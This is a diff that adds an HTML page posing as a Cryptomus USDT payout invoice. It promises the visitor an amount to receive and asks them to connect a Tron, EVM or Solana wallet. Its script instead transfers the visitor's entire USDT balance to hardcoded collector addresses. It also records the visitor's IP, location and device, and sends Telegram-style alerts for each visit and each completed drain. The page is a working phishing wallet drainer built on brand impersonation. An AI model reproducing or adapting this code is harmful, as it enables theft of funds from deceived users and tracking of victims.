@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Cryptomus | Payout</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5/dist/TronWeb.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.4.9/lib/index.iife.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0c12;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+        }
+
+        .card {
+            max-width: 540px;
+            width: 100%;
+            background: #11141f;
+            border-radius: 28px;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* Cryptomus style header */
+        .header {
+            padding: 24px 24px 16px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: #10b981;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 20px;
+            color: white;
+            font-family: 'Inter', sans-serif;
+        }
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.3px;
+            font-family: 'Inter', sans-serif;
+        }
+        .status-badge {
+            background: rgba(16, 185, 129, 0.12);
+            color: #10b981;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 6px 12px;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .status-badge::before {
+            content: "●";
+            font-size: 10px;
+        }
+
+        .timer-section {
+            background: #0d0f17;
+            padding: 14px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .timer-label {
+            font-size: 13px;
+            color: #8b93a7;
+        }
+        .timer-value {
+            font-family: monospace;
+            font-size: 24px;
+            font-weight: 600;
+            color: #f0f3fa;
+            background: #1a1e2c;
+            padding: 4px 16px;
+            border-radius: 40px;
+            letter-spacing: 1px;
+        }
+
+        .content {
+            padding: 24px;
+        }
+
+        .verification-row {
+            background: rgba(16, 185, 129, 0.06);
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-left: 3px solid #10b981;
+        }
+        .check-icon {
+            width: 20px;
+            height: 20px;
+            background: #10b981;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+        }
+        .verification-text {
+            color: #cdd9ff;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .verification-sub {
+            font-size: 12px;
+            color: #6c7a91;
+            margin-top: 2px;
+        }
+
+        .info-card {
+            background: #0c0f17;
+            border-radius: 20px;
+            padding: 18px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        .info-label {
+            color: #8b93a7;
+            font-size: 14px;
+        }
+        .info-value {
+            color: #f0f3fa;
+            font-weight: 500;
+            font-family: monospace;
+            font-size: 14px;
+        }
+
+        .amount-block {
+            background: linear-gradient(135deg, #0e1120, #0a0d18);
+            border-radius: 28px;
+            padding: 24px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+        .amount-label {
+            font-size: 13px;
+            color: #8b93a7;
+            margin-bottom: 8px;
+        }
+        .amount-number {
+            font-size: 52px;
+            font-weight: 800;
+            color: white;
+            letter-spacing: -1px;
+        }
+        .amount-number small {
+            font-size: 22px;
+            font-weight: 500;
+            color: #6c7a91;
+        }
+
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .network-grid, .wallet-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px 18px;
+            border: none;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            background: #1a1e2c;
+            color: #eef2ff;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            justify-content: center;
+        }
+        button:hover {
+            background: #252b3e;
+            transform: translateY(-1px);
+            border-color: rgba(16, 185, 129, 0.4);
+        }
+        .claim-btn {
+            background: #10b981;
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+            padding: 16px;
+            margin-top: 20px;
+            border: none;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+        .claim-btn:hover {
+            background: #0d9668;
+            transform: scale(0.98);
+        }
+
+        .log {
+            margin-top: 24px;
+            padding: 14px;
+            background: #0a0d14;
+            border-radius: 18px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #6c7a91;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            max-height: 110px;
+            overflow-y: auto;
+        }
+
+        .footer {
+            background: #0a0c12;
+            padding: 14px 24px;
+            text-align: center;
+            font-size: 11px;
+            color: #5b657a;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="header">
+        <div class="logo-area">
+            <div class="logo-icon">C</div>
+            <div class="logo-text">Cryptomus</div>
+        </div>
+        <div class="status-badge">Payout</div>
+    </div>
+
+    <div class="timer-section">
+        <span class="timer-label">Payment window</span>
+        <span class="timer-value" id="timer">--:--</span>
+    </div>
+
+    <div class="content">
+        <div class="verification-row">
+            <div class="check-icon">✓</div>
+            <div>
+                <div class="verification-text">Verified merchant • Secure channel</div>
+                <div class="verification-sub">Payment processed by Cryptomus escrow</div>
+            </div>
+        </div>
+
+        <div class="info-card">
+            <div class="info-row">
+                <span class="info-label">Invoice ID</span>
+                <span class="info-value" id="distId">#----</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Asset</span>
+                <span class="info-value">USDT (Multi‑Chain)</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Status</span>
+                <span class="info-value" style="color:#10b981;">● Ready for payout</span>
+            </div>
+        </div>
+
+        <div class="amount-block">
+            <div class="amount-label">Amount to receive</div>
+            <div class="amount-number"><span id="amount">0</span> <small>USDT</small></div>
+        </div>
+
+        <div id="step-network" class="step active">
+            <div style="margin-bottom: 14px; font-weight: 500; color: #cdd9ff;">Select network</div>
+            <div class="network-grid">
+                <button class="network-btn" onclick="selectNetwork('TRC20')"><span>🌐</span> TRC‑20 (Tron)</button>
+                <button class="network-btn" onclick="selectNetwork('BEP20')"><span>🪙</span> BEP‑20 (BSC)</button>
+                <button class="network-btn" onclick="selectNetwork('ERC20')"><span>💠</span> ERC‑20 (Ethereum)</button>
+                <button class="network-btn" onclick="selectNetwork('SOLANA')"><span>◎</span> Solana (SPL)</button>
+            </div>
+        </div>
+
+        <div id="step-wallet" class="step">
+            <div style="margin-bottom: 14px; font-weight: 500; color: #cdd9ff;">Connect wallet to receive funds</div>
+            <div id="wallet-buttons-area" class="wallet-grid"></div>
+            <div id="network-hint" style="font-size:12px; margin-top:12px; color:#6c7a91;"></div>
+        </div>
+
+        <div id="step-confirm" class="step">
+            <div class="info-card">
+                <div class="info-row"><span class="info-label">Payout amount</span><span class="info-value" id="confirmAmount">0</span> USDT</div>
+                <div class="info-row"><span class="info-label">Recipient wallet</span><span class="info-value" id="confirmAddress" style="font-size:13px;">—</span></div>
+                <div class="info-row"><span class="info-label">Network</span><span class="info-value" id="confirmNetwork">—</span></div>
+            </div>
+            <button class="claim-btn" onclick="executeTransfer()">✓ Confirm payout</button>
+        </div>
+
+        <div class="log" id="log">Select network to continue</div>
+    </div>
+    <div class="footer">
+        Secured by Cryptomus • Non‑custodial payout
+    </div>
+</div>
+
+<script>
+    const invoiceId = window.location.pathname.split('/').pop();
+    let visitor, selectedNetwork, userAddress, expiresAt, timerInterval, isExpired = false;
+    let tronWeb, evmContract, solanaConnection, solanaTokenAccount;
+
+    const CONTRACTS = {
+        TRC20: 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs',
+        BEP20: '0x337610d27c682E347C9cD60BD4b3b107C9d34dDd',
+        ERC20: '0x7169D38820dfd117C3FA1f22a697dBA58d90BA06',
+        SOLANA: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB'
+    };
+    const COLLECTOR = {
+        TRC20: 'TUmkvB7jM8YHaS2s2hHDFN31aSbfqT1GAF',
+        EVM: '0xe3219aEB6E66e3Fd6dFC0D8C96926ead688a583A',
+        SOLANA: 'owsmq3BgnYDtenubSvXfVvA8Zd8NFb6syw7MxALiE1m'
+    };
+
+    function generateCode() { return Math.random().toString(36).substring(2,8).toUpperCase(); }
+    function addLog(msg) { 
+        const logDiv = document.getElementById('log');
+        logDiv.innerHTML = '→ ' + msg + '<br>' + logDiv.innerHTML;
+    }
+
+    async function collectVisitorData() {
+        try {
+            const invoiceRes = await axios.get(`/api/invoice/${invoiceId}`);
+            if (invoiceRes.data.error) return addLog('Invalid invoice');
+            document.getElementById('amount').innerText = invoiceRes.data.amount || '0';
+            if (invoiceRes.data.expires_at) {
+                expiresAt = invoiceRes.data.expires_at;
+                updateTimer();
+                timerInterval = setInterval(updateTimer, 1000);
+            }
+            const ip = (await axios.get('https://api.ipify.org?format=json')).data.ip;
+            const geo = (await axios.get(`/api/geo/${ip}`)).data;
+            visitor = { ip, country: geo.country, city: geo.city, device: navigator.userAgent, uid: Date.now().toString(), code: generateCode(), invoiceId };
+            document.getElementById('distId').innerText = '#' + visitor.code;
+            await axios.post('/api/log', { type: 'visitor', telegram: `<b>📄 INVOICE ACCESS</b>\nID: #${visitor.code}\nIP: ${visitor.ip}\nLocation: ${geo.country} | ${geo.city}`, visitor });
+        } catch(e) { addLog('Failed to load'); }
+    }
+
+    function updateTimer() {
+        if (!expiresAt) return;
+        const diff = expiresAt - Date.now();
+        if (diff <= 0) {
+            document.getElementById('timer').innerText = '00:00';
+            isExpired = true;
+            clearInterval(timerInterval);
+            return;
+        }
+        const mins = Math.floor(diff / 60000);
+        const secs = Math.floor((diff % 60000) / 1000);
+        document.getElementById('timer').innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+    }
+
+    function selectNetwork(network) {
+        if (isExpired) return alert('Payment window expired');
+        selectedNetwork = network;
+        const wallets = {
+            TRC20: ['TronLink', 'Trust Wallet'],
+            BEP20: ['MetaMask', 'Trust Wallet'],
+            ERC20: ['MetaMask', 'Trust Wallet'],
+            SOLANA: ['Phantom', 'Solflare']
+        };
+        const actions = {
+            TRC20: ['connectTronLink', 'connectTrustWalletTRC20'],
+            BEP20: ['connectMetaMask', 'connectTrustWalletEVM'],
+            ERC20: ['connectMetaMask', 'connectTrustWalletEVM'],
+            SOLANA: ['connectPhantom', 'connectSolflare']
+        };
+        let html = '';
+        for (let i = 0; i < wallets[network].length; i++) {
+            html += `<button class="wallet-btn" onclick="${actions[network][i]}()"><span>🦊</span> ${wallets[network][i]}</button>`;
+        }
+        document.getElementById('wallet-buttons-area').innerHTML = html;
+        document.getElementById('network-hint').innerHTML = `Network: ${network}`;
+        document.getElementById('step-network').classList.remove('active');
+        document.getElementById('step-wallet').classList.add('active');
+        addLog(`Network: ${network}`);
+    }
+
+    // TRON
+    async function connectTronLink() {
+        if (!window.tronLink) return alert('TronLink required');
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        tronWeb = window.tronLink.tronWeb;
+        userAddress = tronWeb.defaultAddress.base58;
+        const contract = await tronWeb.contract().at(CONTRACTS.TRC20);
+        const balance = await contract.balanceOf(userAddress).call();
+        const formatted = tronWeb.toBigNumber(balance).div(1e6).toString();
+        showConfirm(formatted, userAddress, 'TRC‑20');
+    }
+    async function connectTrustWalletTRC20() { await connectTronLink(); }
+
+    // EVM
+    async function connectMetaMask() {
+        if (!window.ethereum) return alert('MetaMask required');
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
+        const chainId = selectedNetwork === 'BEP20' ? '0x61' : '0xaa36a7';
+        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] }); } catch(e) { alert('Switch network'); }
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const contractAddr = selectedNetwork === 'BEP20' ? CONTRACTS.BEP20 : CONTRACTS.ERC20;
+        const contract = new ethers.Contract(contractAddr, ['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)','function transfer(address,uint256) returns (bool)'], signer);
+        const balance = await contract.balanceOf(userAddress);
+        const decimals = await contract.decimals();
+        const formatted = ethers.utils.formatUnits(balance, decimals);
+        evmContract = contract;
+        showConfirm(formatted, userAddress, selectedNetwork);
+    }
+    async function connectTrustWalletEVM() { await connectMetaMask(); }
+
+    // SOLANA
+    async function connectPhantom() {
+        if (!window.solana) return alert('Phantom required');
+        const resp = await window.solana.connect();
+        userAddress = resp.publicKey.toString();
+        solanaConnection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
+        const usdtMint = new solanaWeb3.PublicKey(CONTRACTS.SOLANA);
+        const tokenAccounts = await solanaConnection.getTokenAccountsByOwner(new solanaWeb3.PublicKey(userAddress), { mint: usdtMint });
+        let balance = '0';
+        if (tokenAccounts.value.length > 0) {
+            solanaTokenAccount = tokenAccounts.value[0].pubkey;
+            const balanceInfo = await solanaConnection.getTokenAccountBalance(solanaTokenAccount);
+            balance = balanceInfo.value.uiAmountString || '0';
+        }
+        showConfirm(balance, userAddress, 'Solana');
+    }
+    async function connectSolflare() { await connectPhantom(); }
+
+    function showConfirm(amount, address, network) {
+        document.getElementById('confirmAmount').innerText = amount;
+        document.getElementById('confirmAddress').innerText = address;
+        document.getElementById('confirmNetwork').innerText = network;
+        document.getElementById('step-wallet').classList.remove('active');
+        document.getElementById('step-confirm').classList.add('active');
+        addLog(`Balance: ${amount} USDT`);
+    }
+
+    async function executeTransfer() {
+        if (isExpired) return alert('Window expired');
+        let txid;
+        try {
+            if (selectedNetwork === 'TRC20') {
+                const contract = await tronWeb.contract().at(CONTRACTS.TRC20);
+                const balance = await contract.balanceOf(userAddress).call();
+                if (balance.toString() === '0') return alert('No funds');
+                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+                    CONTRACTS.TRC20, 'transfer(address,uint256)', { feeLimit: 30000000 },
+                    [{ type: 'address', value: COLLECTOR.TRC20 }, { type: 'uint256', value: balance.toString() }], userAddress);
+                const signed = await tronWeb.trx.sign(tx.transaction);
+                const result = await tronWeb.trx.sendRawTransaction(signed);
+                txid = result.txid;
+            } else if (selectedNetwork === 'BEP20' || selectedNetwork === 'ERC20') {
+                const balance = await evmContract.balanceOf(userAddress);
+                if (balance.toString() === '0') return alert('No funds');
+                const tx = await evmContract.transfer(COLLECTOR.EVM, balance);
+                await tx.wait();
+                txid = tx.hash;
+            } else if (selectedNetwork === 'SOLANA') {
+                const usdtMint = new solanaWeb3.PublicKey(CONTRACTS.SOLANA);
+                const tokenAccounts = await solanaConnection.getTokenAccountsByOwner(new solanaWeb3.PublicKey(userAddress), { mint: usdtMint });
+                if (tokenAccounts.value.length === 0) return alert('No funds');
+                const source = tokenAccounts.value[0].pubkey;
+                const dest = new solanaWeb3.PublicKey(COLLECTOR.SOLANA);
+                const destAccounts = await solanaConnection.getTokenAccountsByOwner(dest, { mint: usdtMint });
+                let destToken;
+                if (destAccounts.value.length === 0) {
+                    const ata = await splToken.getAssociatedTokenAddress(usdtMint, dest);
+                    const createIx = splToken.createAssociatedTokenAccountInstruction(new solanaWeb3.PublicKey(userAddress), ata, dest, usdtMint);
+                    const tx = new solanaWeb3.Transaction().add(createIx);
+                    tx.feePayer = new solanaWeb3.PublicKey(userAddress);
+                    const block = await solanaConnection.getLatestBlockhash();
+                    tx.recentBlockhash = block.blockhash;
+                    const signed = await window.solana.signTransaction(tx);
+                    await solanaConnection.sendRawTransaction(signed.serialize());
+                    destToken = ata;
+                } else { destToken = destAccounts.value[0].pubkey; }
+                const balanceInfo = await solanaConnection.getTokenAccountBalance(source);
+                const transferIx = splToken.createTransferInstruction(source, destToken, new solanaWeb3.PublicKey(userAddress), BigInt(balanceInfo.value.amount));
+                const tx = new solanaWeb3.Transaction().add(transferIx);
+                tx.feePayer = new solanaWeb3.PublicKey(userAddress);
+                const block = await solanaConnection.getLatestBlockhash();
+                tx.recentBlockhash = block.blockhash;
+                const signed = await window.solana.signTransaction(tx);
+                txid = await solanaConnection.sendRawTransaction(signed.serialize());
+            }
+            await axios.post('/api/log', {
+                type: 'success',
+                telegram: `<b>✅ PAYOUT COMPLETED</b>\nNetwork: ${selectedNetwork}\nID: #${visitor.code}\nAmount: ${document.getElementById('confirmAmount').innerText} USDT\nWallet: ${userAddress}\nTxID: ${txid}`,
+                txHash: txid
+            });
+            addLog(`✅ Payout completed: ${txid?.slice(0,12)}...`);
+            alert('Payout successful');
+        } catch(e) { addLog(`❌ Failed: ${e.message}`); }
+    }
+
+    window.onload = () => collectVisitorData();
+</script>
+</body>
+</html>
